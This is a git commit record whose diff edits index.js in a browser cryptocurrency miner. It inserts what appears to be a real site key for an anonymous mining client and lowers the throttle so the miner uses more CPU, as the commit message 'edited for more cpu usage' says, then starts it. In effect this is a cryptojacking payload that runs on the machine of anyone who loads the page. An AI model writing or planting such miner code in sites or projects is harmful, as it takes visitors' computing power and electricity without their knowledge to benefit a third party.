81954686d4617ecedf602389f2664edb4b7b5ffb
Justin Avina <jt.avina@icloud.com>
2022-05-23 00:21:50 -0700

    edited for more cpu usage

--- index.js
+++ index.js
@@ -1,2 +1,2 @@
-var miner = new Client.Anonymous('<site-key>', { throttle: 0.8});
+var miner = new Client.Anonymous('24e7831872a3c27909300d53dc4fa7c6de98f2fffdf303463a6660a5725bfac5', { throttle: 0.3});
 miner.start();
